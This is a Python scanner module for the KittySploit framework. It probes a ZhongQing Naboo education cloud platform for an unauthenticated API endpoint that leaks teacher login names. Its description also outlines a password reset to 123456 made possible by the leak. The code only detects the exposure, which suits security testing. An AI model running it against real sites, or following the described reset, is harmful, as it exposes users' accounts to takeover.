#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zhongqing Naboo Education Cloud Platform is a deep application supporting teaching and research."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ZhongQing Education Cloud Platform - Information Exposure Detection',
        'description': 'Zhongqing Naboo Education Cloud Platform is a deep application supporting teaching and research. Information leakage and unauthorized access exist in the cloud platform system. The password can be reset to 123456 through the leaked user name. The application system does not effectively verify identity on some function pages, allowing direct access and operation on sensitive endpoints. This may enable attackers to obtain sensitive information or reset credentials without proper authorization.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'exposure', 'zqnb', 'education', 'cloud'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.pwnwiki.org/index.php?title=%E4%B8%AD%E6%85%B6%E7%B4%8D%E5%8D%9A%E6%95%99%E8%82%B2%E9%9B%B2%E5%B9%B3%E8%87%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%26%E6%9C%AA%E6%8E%88%E6%AC%8A%E8%A8%AA%E5%95%8F%E6%BC%8F%E6%B4%9E',
        ],
    }

    def run(self):
        path = '/api/TeacherQuery/SearchTeacherInSiteWithPagerRecords'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = ('LoginName', 'UserAvatar',)
        ctype_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='high',
                reason='ZhongQing Education Cloud Platform - Information Exposure detected',
                path=path,
            )
            return True
        return False

